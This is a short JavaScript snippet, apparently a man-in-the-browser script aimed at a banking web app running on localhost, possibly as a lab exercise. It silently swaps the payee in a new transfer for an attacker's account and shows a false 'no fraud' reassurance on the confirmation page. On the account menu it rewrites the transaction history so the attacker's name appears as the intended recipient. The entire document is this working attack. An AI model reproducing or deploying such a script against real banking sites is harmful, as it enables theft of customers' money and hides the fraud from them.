var victimName = "{LoadingError}";
let beneficjent = "gluwnyklijent"
if (window.location == "http://localhost:8000/new_transaction" ) {

  const input = document.querySelector("center > form:nth-child(3) > input:nth-child(2)");
  const inputMoney = document.querySelector("center > form:nth-child(3) > input:nth-child(3)");
  moneyValue = inputMoney.value;
  victimName = input.value;
  input.value = beneficjent;
}if (window.location == "http://localhost:8000/new_transaction/confirm" ) {
  p = document.querySelector("center > p:nth-child(1)");
  p.innerHTML = "Money sent without any kind of fraud dont worry at all";

} else if (window.location == "http://localhost:8000/menu") {
  const recipients = document.querySelectorAll(".table > tbody:nth-child(2) > tr > td:nth-child(2)");
  for (field of recipients) {
    if (field.innerText == beneficjent) {
      field.innerText = victimName;
    }
  }
}